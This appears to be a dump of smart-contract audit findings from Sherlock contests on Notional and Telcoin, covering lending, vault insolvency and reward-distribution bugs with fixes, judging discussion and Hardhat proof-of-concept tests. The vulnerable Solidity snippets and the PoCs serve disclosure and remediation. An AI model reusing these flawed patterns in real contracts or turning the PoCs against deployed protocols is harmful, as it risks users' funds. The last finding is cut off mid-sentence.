      PrimeRate memory pr\n    ) internal pure returns (uint256 targetAmount) {\n// rest of code\n\n        targetAmount = SafeUint256.min(\n            // totalPrimeCashInUnderlying and totalPrimeDebtInUnderlying are in 8 decimals, convert it to native\n            // token precision here for accurate comparison. No underflow possible since targetExternalUnderlyingLend\n            // is floored at zero.\n            uint256(underlyingToken.convertToExternal(targetExternalUnderlyingLend)),\n            // maxExternalUnderlyingLend is limit enforced by setting externalWithdrawThreshold\n            // maxExternalDeposit is limit due to the supply cap on external pools\n          SafeUint256.min(maxExternalUnderlyingLend, oracleData.maxExternalDeposit)\n        );\n```\n\nthis is : `targetAmount = min(targetExternalUnderlyingLend, maxExternalUnderlyingLend, oracleData.maxExternalDeposit)`\nThe problem is that when calculating `oracleData.maxExternalDeposit`, it does not exclude the existing deposit `currentExternalUnderlyingLend` of the current protocol.\nFor example: `currentExternalUnderlyingLend = 100` `targetExternalUnderlyingLend = 100` `maxExternalUnderlyingLend = 10000` `oracleData.maxExternalDeposit = 0` (All AAVE deposits include the current deposit currentExternalUnderlyingLend)\nIf according to the current calculation result: `targetAmount=0`, this will result in needing to withdraw `100`. (currentExternalUnderlyingLend - targetAmount)\nIn fact, only when the calculation result needs to increase the `deposit` (targetAmount > currentExternalUnderlyingLend), it needs to be restricted by `maxExternalDeposit`.\nThe correct one should be neither deposit nor withdraw, that is, `targetAmount=currentExternalUnderlyingLend = 100`.чOnly when `targetAmount > currentExternalUnderlyingLend` is a deposit needed, it should be considered that it cannot exceed `oracleData.maxExternalDeposit`\n```\n    function getTargetExternalLendingAmount(\n        Token memory underlyingToken,\n        PrimeCashFactors memory factors,\n        RebalancingTargetData memory rebalancingTargetData,\n        OracleData memory oracleData,\n        PrimeRate memory pr\n    ) internal pure returns (uint256 targetAmount) {\n// rest of code\n\n// Remove the line below\n        targetAmount = SafeUint256.min(\n// Remove the line below\n            // totalPrimeCashInUnderlying and totalPrimeDebtInUnderlying are in 8 decimals, convert it to native\n// Remove the line below\n            // token precision here for accurate comparison. No underflow possible since targetExternalUnderlyingLend\n// Remove the line below\n            // is floored at zero.\n// Remove the line below\n            uint256(underlyingToken.convertToExternal(targetExternalUnderlyingLend)),\n// Remove the line below\n            // maxExternalUnderlyingLend is limit enforced by setting externalWithdrawThreshold\n// Remove the line below\n            // maxExternalDeposit is limit due to the supply cap on external pools\n// Remove the line below\n            SafeUint256.min(maxExternalUnderlyingLend, oracleData.maxExternalDeposit)\n// Remove the line below\n        );\n\n// Add the line below\n       targetAmount = SafeUint256.min(uint256(underlyingToken.convertToExternal(targetExternalUnderlyingLend)),maxExternalUnderlyingLend);\n// Add the line below\n       if (targetAmount > oracleData.currentExternalUnderlyingLend) { //when deposit ,  must check maxExternalDeposit\n// Add the line below\n            uint256 forDeposit = targetAmount // Remove the line below\n oracleData.currentExternalUnderlyingLend;\n// Add the line below\n            if (forDeposit > oracleData.maxExternalDeposit) {\n// Add the line below\n                targetAmount = targetAmount.sub(\n// Add the line below\n                    forDeposit // Remove the line below\n oracleData.maxExternalDeposit\n// Add the line below\n                );                \n// Add the line below\n            }\n// Add the line below\n        }\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid because { This is valid medium ; watson explained how an incorrect value can be returned}чA too small `targetAmount` will cause the withdrawal of deposits that should not be withdrawn, damaging the interests of the protocol.\nCode Snippet\nTool used\nManual Review
`wfCashERC4626`чmediumч```\n    if (maxFCash < fCashAmount) {\n        // NOTE: lending at zero\n        uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);\n        require(fCashAmountExternal <= depositAmountExternal);\n\n        // NOTE: Residual (depositAmountExternal - fCashAmountExternal) will be transferred\n        // back to the account\n        NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);\n    } else if (isETH || hasTransferFee || getCashBalance() > 0) {\n```\nчThe `wfCash` vault is credited less prime cash than the `wfCash` it mints to the depositor when its underlying asset is a fee-on-transfer token. This leads to the vault being insolvent because it has issued more shares than can be redeemed.\n```\n    if (maxFCash < fCashAmount) {\n        // NOTE: lending at zero\n        uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);\n        require(fCashAmountExternal <= depositAmountExternal);\n\n        // NOTE: Residual (depositAmountExternal - fCashAmountExternal) will be transferred\n        // back to the account\n        NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);\n    } else if (isETH || hasTransferFee || getCashBalance() > 0) {\n```\n\n```\n        } else {\n            // In the case of deposits, we use a balance before and after check\n            // to ensure that we record the proper balance change.\n            actualTransferExternal = GenericToken.safeTransferIn(\n                underlying.tokenAddress, account, underlyingExternalDeposit\n            ).toInt();\n        }\n\n        netPrimeSupplyChange = _postTransferPrimeCashUpdate(\n            account, currencyId, actualTransferExternal, underlying, primeRate\n        );\n```\n\n```\n    // Mints ERC20 tokens for the receiver\n    _mint(receiver, fCashAmount);\n```\n\nIn the case of lending at 0% interest, `fCashAmount` is equal to `depositAmount` but at 1e8 precision.\nTo simplify the example, let us assume that there are no other depositors. When the sole depositor redeems all their `wfCash` shares at maturity, they will be unable to redeem all their shares because the `wfCash` vault does not hold enough prime cash.ч"Consider adding the following:\nA flag in `wfCashERC4626` that signals that the vault's asset is a fee-on-transfer token.\nIn `wfCashERC4626._previewMint()` and `wfCashERC46262._previewDeposit`, all calculations related to `assets` should account for the transfer fee of the token.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvlaid because { This is valid and a duplicate of 016 due to the same underlying cause of zero lending }\njeffywu\nI think the issue is valid, although the contention that the vault becomes insolvent is not completely true. When lending at 0% interest the vault also accrues variable rate interest, which may or may not accrue sufficient value to recover the loss from the transfer fee.\nAgree that some sort of flag here would be appropriate to ensure that these tokens do not trigger an immediate loss is appropriate.\njeffywu\nFix will be that we do not allow tokens with fee on transfer to perform lend at zero.\ngjaldon\nEscalate\nI think the issue is valid, although the contention that the vault becomes insolvent is not completely true. When lending at 0% interest the vault also accrues variable rate interest, which may or may not accrue sufficient value to recover the loss from the transfer fee.\nI think this is a High because the vault still stays insolvent even when the vault accrues variable rate interest. This is because any variable rate interest accrual is only applied to the prime cash's exchange rate (like a cToken.)\nThe issue here is that the total `wfCash` minted is supposed to be 1:1 with the vault's primeCash balance in Notional. However, there is more `wfCash` minted than the vault's prime cash balance in Notional because the Vault's `wfCash` minting does not subtract the transfer fees when computing for the amount to mint, which leads to the discrepancy.\nAny variable interest rate accrual will not increase the prime cash balance of the Vault because it is non-rebasing. That means that the Vault's prime cash balance in Notional will not increase due to accrual and it will remain less than the Vault's total `wfCash` minted and the vault will remain insolvent.\nFor example: Vault `wfCash` supply - 1000 Vault's prime cash balance in Notional - 975 (1000 - 2.5% transfer fee) Variable interest rate accrual - increases the exchange rate from, for example, 110% to 115%\nTotal `wfCash` that can be redeemed is still capped at 975 even with the variable interest rate accrual. Vault remains insolvent because not all shares can be redeemed.\nsherlock-admin2\nEscalate\nI think the issue is valid, although the contention that the vault becomes insolvent is not completely true. When lending at 0% interest the vault also accrues variable rate interest, which may or may not accrue sufficient value to recover the loss from the transfer fee.\nI think this is a High because the vault still stays insolvent even when the vault accrues variable rate interest. This is because any variable rate interest accrual is only applied to the prime cash's exchange rate (like a cToken.)\nThe issue here is that the total `wfCash` minted is supposed to be 1:1 with the vault's primeCash balance in Notional. However, there is more `wfCash` minted than the vault's prime cash balance in Notional because the Vault's `wfCash` minting does not subtract the transfer fees when computing for the amount to mint, which leads to the discrepancy.\nAny variable interest rate accrual will not increase the prime cash balance of the Vault because it is non-rebasing. That means that the Vault's prime cash balance in Notional will not increase due to accrual and it will remain less than the Vault's total `wfCash` minted and the vault will remain insolvent.\nFor example: Vault `wfCash` supply - 1000 Vault's prime cash balance in Notional - 975 (1000 - 2.5% transfer fee) Variable interest rate accrual - increases the exchange rate from, for example, 110% to 115%\nTotal `wfCash` that can be redeemed is still capped at 975 even with the variable interest rate accrual. Vault remains insolvent because not all shares can be redeemed.\nThe escalation could not be created because you are not exceeding the escalation threshold.\nYou can view the required number of additional valid issues/judging contest payouts in your Profile page, in the Sherlock webapp.\nJeffCX\nEscalate\nI think the issue is valid, although the contention that the vault becomes insolvent is not completely true. When lending at 0% interest the vault also accrues variable rate interest, which may or may not accrue sufficient value to recover the loss from the transfer fee.\nI think this is a High because the vault still stays insolvent even when the vault accrues variable rate interest. This is because any variable rate interest accrual is only applied to the prime cash's exchange rate (like a cToken.)\nThe issue here is that the total wfCash minted is supposed to be 1:1 with the vault's primeCash balance in Notional. However, there is more wfCash minted than the vault's prime cash balance in Notional because the Vault's wfCash minting does not subtract the transfer fees when computing for the amount to mint, which leads to the discrepancy.\nAny variable interest rate accrual will not increase the prime cash balance of the Vault because it is non-rebasing. That means that the Vault's prime cash balance in Notional will not increase due to accrual and it will remain less than the Vault's total wfCash minted and the vault will remain insolvent.\nFor example: Vault wfCash supply - 1000 Vault's prime cash balance in Notional - 975 (1000 - 2.5% transfer fee) Variable interest rate accrual - increases the exchange rate from, for example, 110% to 115%\nTotal wfCash that can be redeemed is still capped at 975 even with the variable interest rate accrual. Vault remains insolvent because not all shares can be redeemed.\nsherlock-admin2\nEscalate\nI think the issue is valid, although the contention that the vault becomes insolvent is not completely true. When lending at 0% interest the vault also accrues variable rate interest, which may or may not accrue sufficient value to recover the loss from the transfer fee.\nI think this is a High because the vault still stays insolvent even when the vault accrues variable rate interest. This is because any variable rate interest accrual is only applied to the prime cash's exchange rate (like a cToken.)\nThe issue here is that the total wfCash minted is supposed to be 1:1 with the vault's primeCash balance in Notional. However, there is more wfCash minted than the vault's prime cash balance in Notional because the Vault's wfCash minting does not subtract the transfer fees when computing for the amount to mint, which leads to the discrepancy.\nAny variable interest rate accrual will not increase the prime cash balance of the Vault because it is non-rebasing. That means that the Vault's prime cash balance in Notional will not increase due to accrual and it will remain less than the Vault's total wfCash minted and the vault will remain insolvent.\nFor example: Vault wfCash supply - 1000 Vault's prime cash balance in Notional - 975 (1000 - 2.5% transfer fee) Variable interest rate accrual - increases the exchange rate from, for example, 110% to 115%\nTotal wfCash that can be redeemed is still capped at 975 even with the variable interest rate accrual. Vault remains insolvent because not all shares can be redeemed.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\njeffywu\nI won't opine the severity of the issue but I will say the understanding of the prime cash balance is not entirely correct in the escalation comment:\nfCash is denominated in underlying (i.e. 1 fETH = 1 ETH at maturity) while prime cash is a non-rebasing token with a monotonically increasing exchange rate to ETH. If we mint 1 fETH ""share"" while lending at zero interest but only deposit 0.975 ETH worth of pCash prior to maturity...it would be appropriate to say that the vault is insolvent at this moment in time.\nHowever, if the 0.975 ETH worth of pCash accrues interest over X days and is now worth 1 ETH and no other deposits / withdraws occur, the vault is no longer insolvent. The rebasing / non-rebasing nature of pCash does not affect the solvency issue, the vault has full access to the underlying value of the pCash to accommodate withdraws.\ngjaldon\n```\n    function getPrimeCashRateStateful(\n        uint16 currencyId,\n        uint256 blockTime\n    ) internal returns (PrimeRate memory rate) {\n        PrimeCashFactors memory factors = getPrimeCashFactors(currencyId);\n\n        // Only accrue if the block time has increased\n        if (factors.lastAccrueTime < blockTime) {\n            uint256 primeSupplyToReserve;\n            uint256 currentUnderlyingValue = getTotalUnderlyingStateful(currencyId);\n            (factors, primeSupplyToReserve) = _updatePrimeCashScalars(\n                currencyId, factors, currentUnderlyingValue, blockTime\n            );\n            _setPrimeCashFactorsOnAccrue(currencyId, primeSupplyToReserve, factors);\n        } else {\n            require(factors.lastAccrueTime == blockTime); // dev: revert invalid blocktime\n        }\n\n        rate = PrimeRate({\n            supplyFactor: factors.supplyScalar.mul(factors.underlyingScalar).toInt(),\n            debtFactor: factors.debtScalar.mul(factors.underlyingScalar).toInt(),\n            oracleSupplyRate: factors.oracleSupplyRate\n        });\n    }\n```\n\n`_updatePrimeCashScalars()` computes the interest accrual and updates the factors. `PrimeRate.supplyFactor` is the exchange rate that's used to compute for the total ETH that can be withdrawn.\nGiven a Vault that had deposited 1000 tokens into pCash and the following are true:\nVault has 1000 wfCash total supply Vault has pCash balance of 975 in Notional (1000 - 2.5% transfer fee) PR.supplyFactor is 100%\nLet's say the PR.supplyFactor has increased to 120% due to interest accrual. When the Vault withdraws, it calls `AccountAction.withdraw()` which also ends up calling `BalanceHandler._finalize()`.\n```\n        transferAmountExternal = TokenHandler.withdrawPrimeCash(\n            account,\n            receiver,\n            balanceState.currencyId,\n            balanceState.primeCashWithdraw,\n            balanceState.primeRate,\n            withdrawWrapped // if true, withdraws ETH as WETH\n        );\n\n        {\n            // No changes to total cash after this point\n            int256 totalCashChange = balanceState.netCashChange.add(balanceState.primeCashWithdraw);\n           \n            if (\n                checkAllowPrimeBorrow &&\n                totalCashChange < 0 &&\n                balanceState.storedCashBalance.add(totalCashChange) < 0\n            ) {\n                // // rest of code snip // rest of code\n                require(accountContext.allowPrimeBorrow, ""No Prime Borrow"");\n                checkDebtCap = true;\n            }\n\n            if (totalCashChange != 0) {\n                balanceState.storedCashBalance = balanceState.storedCashBalance.add(totalCashChange);\n                mustUpdate = true;\n            }\n        }\n```\n\nIn `BalanceHandler.finalize()`, `balanceState.primeCashWithdraw` is the amount being withdrawn, which is -1000 (all the wfCash supply.) It is negative since withdrawal amounts are turned negative to represent decrease in cash balance. `totalCashChange` will be equal to `balanceState.primeCashWithdraw`, which is -1000. `balanceState.storedCashBalance` will be the Vault's cash balance of 975. Adding both will result in -25 and will lead to the `""No Prime Borrow""` revert since there is not enough cash balance for the withdrawal and prime borrowing is not enabled for the vault.\nIn `TokenHandler.withdrawPrimeCash()` is where the exchange rate is applied so that we get the principal plus the interest accrual.\n```\n// TokenHandler.withdrawPrimeCash()\n\n    Token memory underlying = getUnderlyingToken(currencyId);\n    netTransferExternal = convertToExternal(\n        underlying, \n        primeRate.convertToUnderlying(primeCashToWithdraw) \n    );\n```\n\n`primeRate.convertToUnderlying` converts the prime cash value (principal) into its accrued value (principal + interest accrual.)\n```\n    function convertToUnderlying(\n        PrimeRate memory pr,\n        int256 primeCashBalance\n    ) internal pure returns (int256) {\n        int256 result = primeCashBalance.mul(pr.supplyFactor).div(Constants.DOUBLE_SCALAR_PRECISION);\n        return primeCashBalance < 0 ? SafeInt256.min(result, -1) : result;\n    }\n```\n\nWe see above how `primeRate.supplyFactor`, which is an exchange rate that represents interest accrual for lending, is multiplied to the prime cash balance.\nI think the details above show that the prime cash balance (balanceState.storedCashBalance) does not increase due to interest accrual. With the example above, it will stay at 975 even when interest accrues. This is because interest accruals are only applied to the Prime Cash factors and do not modify every account's cash balances, which would be expensive.\nAm I missing anything @jeffywu?\njeffywu\nYeah, but 0.975 pETH units can be worth 1 ETH which is what is required for the vault to be solvent. If you call withdraw and expect to get 1 ETH, the vault will be able to satisfy the request and therefore it would be solvent.\ngjaldon\nI see. I think the user would expect interest accrual to make their 1 ETH larger than 1 ETH. Also, even though 0.975 pETH can become 1 ETH eventually due to variable interest accrual, there is still the 0.025 pETH that can not be redeemed. A Vault is insolvent when all of its shares can not be redeemed. When there are multiple depositors, this can lead to situations where the last depositor to withdraw will be unable to withdraw any assets.\njeffywu\nWell the user could only expect up to 1 ETH because they have a claim on 1 fETH. They are not lending variable they are lending fixed\nOn Mon, Feb 5, 2024 at 4:06 PM G @.***> wrote:\nI see. I think the user would expect interest accrual to make their 1 ETH larger than 1 ETH. Also, even though 0.975 pETH can become 1 ETH eventually due to variable interest accrual, there is still the 0.025 pETH that can not be redeemed. A Vault is insolvent when all of its shares can not be redeemed. When there are multiple depositors, this can lead to situations where the last depositor to withdraw will be unable to withdraw any assets.\n— Reply to this email directly, view it on GitHub https://github.com/sherlock-audit/2023-12-notional-update-5-judging/issues/58#issuecomment-1928538045, or unsubscribe https://github.com/notifications/unsubscribe-auth/AAHOUGSOW62TRY3ZX3MLMDTYSFXX5AVCNFSM6AAAAABCAQ65JCVHI2DSMVQWIX3LMV43OSLTON2WKQ3PNVWWK3TUHMYTSMRYGUZTQMBUGU . You are receiving this because you were mentioned.Message ID: <sherlock-audit/2023-12-notional-update-5-judging/issues/58/1928538045@ github.com>\ngjaldon\nFair point. I think you are looking at it from the perspective of calling `Vault.withdraw()` where the user sets the amount of assets to be withdrawn. When using `Vault.redeem()`, the user sets the amount of shares to be redeemed. In this case, the amount to be redeemed would be the total shares of 1000. This is what I mean by insolvency, since only up to 975 shares can be redeemed and not all the shares are redeemable.\nThank you for the time and the discussion @jeffywu. I appreciate it and will do my best to carry over all my learnings to future Notional contests.\nEvert0x\nPlanning to reject escalation and keep issue state as is @gjaldon\nEvert0x\nResult: Medium Unique\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nJEFFCX: rejected"чAlthough the example used to display the vulnerability is for the case of lending at 0% interest, the issue exists for minting any amount of shares.\nThe `wfCashERC4626` vault will become insolvent and unable to buy back all shares. The larger the total amount deposited, the larger the deficit. The deficit is equal to the transfer fee. Given a total deposit amount of 100M USDT and a transfer fee of 2% (assuming a transfer fee was set and enabled for USDT), 2M USDT will be the deficit.\nThe last depositors to redeem their shares will be shouldering the loss.\nCode Snippet\nTool used\nManual Review
`ExternalLending`чmediumч```\n        address[] memory targets = new address[](UNDERLYING_IS_ETH ? 2 : 1);\n        bytes[] memory callData = new bytes[](UNDERLYING_IS_ETH ? 2 : 1);\n        targets[0] = LENDING_POOL;\n        callData[0] = abi.encodeWithSelector(\n            ILendingPool.withdraw.selector, underlyingToken, withdrawAmount, address(NOTIONAL)\n        );\n\n        if (UNDERLYING_IS_ETH) {\n            // Aave V3 returns WETH instead of native ETH so we have to unwrap it here\n            targets[1] = address(Deployments.WETH);\n            callData[1] = abi.encodeWithSelector(WETH9.withdraw.selector, withdrawAmount);\n        }\n\n        data = new RedeemData[](1);\n        // Tokens with less than or equal to 8 decimals sometimes have off by 1 issues when depositing\n        // into Aave V3. Aave returns one unit less than has been deposited. This adjustment is applied\n        // to ensure that this unit of token is credited back to prime cash holders appropriately.\n        uint8 rebasingTokenBalanceAdjustment = UNDERLYING_DECIMALS <= 8 ? 1 : 0;\n        data[0] = RedeemData(\n            targets, callData, withdrawAmount, ASSET_TOKEN, rebasingTokenBalanceAdjustment\n        );\n```\nчWhen the Treasury rebalances and has to redeem aTokens from AaveV3, it checks that the actual amount withdrawn is greater than or equal to the set `withdrawAmount`. This check will always fail for fee-on-transfer tokens since the `withdrawAmount` does not account for the transfer fee.\n```\n        address[] memory targets = new address[](UNDERLYING_IS_ETH ? 2 : 1);\n        bytes[] memory callData = new bytes[](UNDERLYING_IS_ETH ? 2 : 1);\n        targets[0] = LENDING_POOL;\n        callData[0] = abi.encodeWithSelector(\n            ILendingPool.withdraw.selector, underlyingToken, withdrawAmount, address(NOTIONAL)\n        );\n\n        if (UNDERLYING_IS_ETH) {\n            // Aave V3 returns WETH instead of native ETH so we have to unwrap it here\n            targets[1] = address(Deployments.WETH);\n            callData[1] = abi.encodeWithSelector(WETH9.withdraw.selector, withdrawAmount);\n        }\n\n        data = new RedeemData[](1);\n        // Tokens with less than or equal to 8 decimals sometimes have off by 1 issues when depositing\n        // into Aave V3. Aave returns one unit less than has been deposited. This adjustment is applied\n        // to ensure that this unit of token is credited back to prime cash holders appropriately.\n        uint8 rebasingTokenBalanceAdjustment = UNDERLYING_DECIMALS <= 8 ? 1 : 0;\n        data[0] = RedeemData(\n            targets, callData, withdrawAmount, ASSET_TOKEN, rebasingTokenBalanceAdjustment\n        );\n```\n\nNote that the third field in the `RedeemData` struct is the `expectedUnderlying` field which is set to the `withdrawAmount` and that `withdrawAmount` is a value greater than zero.\n```\n            for (uint256 j; j < data.targets.length; j++) {\n                GenericToken.executeLowLevelCall(data.targets[j], 0, data.callData[j]);\n            }\n\n            // Ensure that we get sufficient underlying on every redemption\n            uint256 newUnderlyingBalance = TokenHandler.balanceOf(underlyingToken, address(this));\n            uint256 underlyingBalanceChange = newUnderlyingBalance.sub(oldUnderlyingBalance);\n            // If the call is not the final redemption, then expectedUnderlying should\n            // be set to zero.\n            require(data.expectedUnderlying <= underlyingBalanceChange);\n```\n\n```\nredeemAmounts[0] = currentAmount - targetAmount;\n```\n\nIt does not account for transfer fees. In effect, that check will always revert when the underlying being withdrawn is a fee-on-transfer token.чWhen computing for the `withdrawAmount / data.expectedUnderlying`, it should account for the transfer fees. The pseudocode for the computation may look like so:\n```\nwithdrawAmount = currentAmount - targetAmount\nif (underlyingToken.hasTransferFee) {\n  withdrawAmount = withdrawAmount / (100% - underlyingToken.transferFeePercent)\n}\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid because { valid medium findings}\njeffywu\nWhile this is true, I think the protocol would simply opt to not have external lending for fee on transfer tokens. Since this feature is turned on or off by the protocol I don't see how this warrants a high severity.\nnevillehuang\n@jeffywu would this be a duplicate of #58? If I'm not wrong the fix seems different so could be separate.\njeffywu\nNo, it is separate code.ч```\n    uint256 withdrawAmount = uint256(netTransferExternal.neg());\n    ExternalLending.redeemMoneyMarketIfRequired(currencyId, underlying, withdrawAmount);\n```\n\nThis means that these tokens can only be deposited into AaveV3 but can never redeemed. This can lead to insolvency of the protocol.\nCode Snippet\nTool used\nManual Review
`StakingRewardsManager::topUp(...)` Misallocates Funds to `StakingRewards` Contractsчhighч```\n    function topUp(\n        address source,\n        uint256[] memory indices\n    ) external onlyRole(EXECUTOR_ROLE) {\n        for (uint i = 0; i < indices.length; i++) {\n            // get staking contract and config\n            StakingRewards staking = stakingContracts[i];\n            StakingConfig memory config = stakingConfigs[staking];\n\n            // will revert if block.timestamp <= periodFinish\n            staking.setRewardsDuration(config.rewardsDuration);\n\n            // pull tokens from owner of this contract to fund the staking contract\n            rewardToken.transferFrom(\n                source,\n                address(staking),\n                config.rewardAmount\n            );\n\n            // start periods\n            staking.notifyRewardAmount(config.rewardAmount);\n\n            emit ToppedUp(staking, config);\n        }\n    }\n```\nчThe `StakingRewardsManager::topUp(...)` contract exhibits an issue where the specified `StakingRewards` contracts are not topped up at the correct indices, resulting in an incorrect distribution to different contracts.\nThe `StakingRewardsManager::topUp(...)` function is designed to top up multiple `StakingRewards` contracts simultaneously by taking the indices of the contract's addresses in the `StakingRewardsManager::stakingContracts` array. However, the flaw lies in the distribution process:\n```\n    function topUp(\n        address source,\n        uint256[] memory indices\n    ) external onlyRole(EXECUTOR_ROLE) {\n        for (uint i = 0; i < indices.length; i++) {\n            // get staking contract and config\n            StakingRewards staking = stakingContracts[i];\n            StakingConfig memory config = stakingConfigs[staking];\n\n            // will revert if block.timestamp <= periodFinish\n            staking.setRewardsDuration(config.rewardsDuration);\n\n            // pull tokens from owner of this contract to fund the staking contract\n            rewardToken.transferFrom(\n                source,\n                address(staking),\n                config.rewardAmount\n            );\n\n            // start periods\n            staking.notifyRewardAmount(config.rewardAmount);\n\n            emit ToppedUp(staking, config);\n        }\n    }\n```\n\nGitHub: [254-278]\nThe rewards are not appropriately distributed to the `StakingRewards` contracts at the specified indices. Instead, they are transferred to the contracts at the loop indices. For instance, if intending to top up contracts at indices `[1, 2]`, the actual top-up occurs at indices `[0, 1]`.чIt is recommended to do the following changes:\n```\n    function topUp(\n        address source,\n        uint256[] memory indices\n    ) external onlyRole(EXECUTOR_ROLE) {\n        for (uint i = 0; i < indices.length; i// Add the line below\n// Add the line below\n) {\n            // get staking contract and config\n// Remove the line below\n            StakingRewards staking = stakingContracts[i];\n// Add the line below\n           StakingRewards staking = stakingContracts[indices[i]];\n            StakingConfig memory config = stakingConfigs[staking];\n\n            // will revert if block.timestamp <= periodFinish\n            staking.setRewardsDuration(config.rewardsDuration);\n\n            // pull tokens from owner of this contract to fund the staking contract\n            rewardToken.transferFrom(\n                source,\n                address(staking),\n                config.rewardAmount\n            );\n\n            // start periods\n            staking.notifyRewardAmount(config.rewardAmount);\n\n            emit ToppedUp(staking, config);\n        }\n    }\n```\n\nDiscussion\namshirif\nhttps://github.com/telcoin/telcoin-audit/pull/27\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid because { I consider this a high severity and avalid issues; the watson was able to explain how the topUp function will perform an unintended actions by topping up from the 0 index of the array always due to lack of good implementation of the indices that was supposed to be added before the (i) }\nnevillehuang\n@amshirif Will this allow the stakers of the wrong contract funded to retrieve unintended rewards? If yes I will remain as high severity.\namshirif\n@nevillehuang Yes this would potentially cause those who should have gotten rewards to have received less or non at all, and those who were not intended to get any or less than their desired amount to get more than they should have.\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/telcoin/telcoin-audit/pull/27.ч"The consequence of this vulnerability is that rewards will be distributed to the incorrect staking contract, leading to potential misallocation and unintended outcomes\nCode Snippet\nHere is a test for PoC:\nAdd the below given test in `StakingRewardsManager.test.ts` File. And use the following command to run the test\n```\nnpx hardhat test --grep ""TopUp is not done to intended staking rewards contracts""\n```\n\nTEST:\n```\n        it(""TopUp is not done to intended staking rewards contracts"", async function () {\n            // add index 2 to indices\n            // so topup should be done to index 0 and 2\n            indices = [0, 2];\n\n            await rewardToken.connect(deployer).approve(await stakingRewardsManager.getAddress(), tokenAmount * indices.length);\n            \n            // create 3 staking contracts\n            await stakingRewardsManager.createNewStakingRewardsContract(await stakingToken.getAddress(), newStakingConfig);\n            await stakingRewardsManager.createNewStakingRewardsContract(await stakingToken.getAddress(), newStakingConfig);\n            await stakingRewardsManager.createNewStakingRewardsContract(await stakingToken.getAddress(), newStakingConfig);\n\n            // topup index 0 and 2\n            await expect(stakingRewardsManager.connect(deployer).topUp(await deployer.address, indices))\n                .to.emit(stakingRewardsManager, ""ToppedUp"");\n\n\n            // getting the staking contract at index 0, 1 and 2\n            let stakingContract0 = await stakingRewardsManager.stakingContracts(0);\n            let stakingContract1 = await stakingRewardsManager.stakingContracts(1);\n            let stakingContract2 = await stakingRewardsManager.stakingContracts(2);\n\n            // Staking contract at index 2 should be empty\n            expect(await rewardToken.balanceOf(stakingContract2)).to.equal(0);\n\n            // Staking contract at index 0 and 1 should have 100 tokens\n            expect(await rewardToken.balanceOf(stakingContract0)).to.equal(100);\n            expect(await rewardToken.balanceOf(stakingContract1)).to.equal(100);\n\n        });\n```\n\nOutput:\n```\nAAMIR@Victus MINGW64 /d/telcoin-audit/telcoin-audit (main)\n$ npx hardhat test --grep ""TopUp is not done to intended staking rewards contracts""\n\n\n  StakingRewards and StakingRewardsFactory\n    topUp\n      ✔ TopUp is not done to intended staking rewards contracts (112ms)\n\n\n  1 passing (2s)\n```\n\nTool used\nManual Review"
CouncilMember:burn renders the contract inoperable after the first executionчhighч"```\ndiff --git a/telcoin-audit/test/sablier/CouncilMember.test.ts b/telcoin-audit/test/sablier/CouncilMember.test.ts\nindex 675b89d..ab96b08 100644\n--- a/telcoin-audit/test/sablier/CouncilMember.test.ts\n+++ b/telcoin-audit/test/sablier/CouncilMember.test.ts\n@@ -1,13 +1,14 @@\n import { expect } from ""chai"";\n import { ethers } from ""hardhat"";\n import { SignerWithAddress } from ""@nomicfoundation/hardhat-ethers/signers"";\n-import { CouncilMember, TestTelcoin, TestStream } from ""../../typechain-types"";\n+import { CouncilMember, TestTelcoin, TestStream, ERC721Upgradeable__factory } from ""../../typechain-types"";\n \n describe(""CouncilMember"", () => {\n     let admin: SignerWithAddress;\n     let support: SignerWithAddress;\n     let member: SignerWithAddress;\n     let holder: SignerWithAddress;\n+    let lastCouncilMember: SignerWithAddress;\n     let councilMember: CouncilMember;\n     let telcoin: TestTelcoin;\n     let stream: TestStream;\n@@ -18,7 +19,7 @@ describe(""CouncilMember"", () => {\n     let supportRole: string = ethers.keccak256(ethers.toUtf8Bytes(""SUPPORT_ROLE""));\n \n     beforeEach(async () => {\n-        [admin, support, member, holder, target] = await ethers.getSigners();\n+        [admin, support, member, holder, target, lastCouncilMember] = await ethers.getSigners();\n \n         const TestTelcoinFactory = await ethers.getContractFactory(""TestTelcoin"", admin);\n         telcoin = await TestTelcoinFactory.deploy(admin.address);\n@@ -182,6 +183,22 @@ describe(""CouncilMember"", () => {\n                 it(""the correct removal is made"", async () => {\n                     await expect(councilMember.burn(1, support.address)).emit(councilMember, ""Transfer"");\n                 });\n+                it.only(""inoperable contract after burn"", async () => {\n+                    await expect(councilMember.mint(lastCouncilMember.address)).to.not.reverted;\n+\n+                    // This 1st burn will cause contract inoperable due to tokenId & balances misalignment\n+                    await expect(councilMember.burn(1, support.address)).emit(councilMember, ""Transfer"");\n+\n+                    // Impact 1. holder with tokenId > balances length cannot claim\n+                    await expect(councilMember.connect(lastCouncilMember).claim(3, 1)).to.revertedWithPanic(""0x32""); // @audit-info 0x32: Array accessed at an out-of-bounds or negative index\n+\n+                    // Impact 2. subsequent burns of tokenId > balances length will revert\n+                    await expect(councilMember.burn(3, lastCouncilMember.address)).to.revertedWithPanic(""0x32""); \n+\n+                    // Impact 3. subsequent mint will revert due to tokenId collision\n+                    await expect(councilMember.mint(lastCouncilMember.address)).to.revertedWithCustomError(councilMember, ""ERC721InvalidSender"");\n+\n+                });\n             });\n         });\n \n```\n"ч"The CouncilMember contract suffers from a critical vulnerability that misaligns the balances array after a successful burn, rendering the contract inoperable.\nThe root cause of the vulnerability is that the `burn` function incorrectly manages the `balances` array, shortening it by one each time an ERC721 token is burned while the latest minted NFT still withholds its unique `tokenId` which maps to the previous value of `balances.length`.\nThis misalignment between existing `tokenIds` and the `balances` array results in several critical impacts:\nHolders with `tokenId` greater than the length of balances cannot claim.\nSubsequent burns of `tokenId` greater than 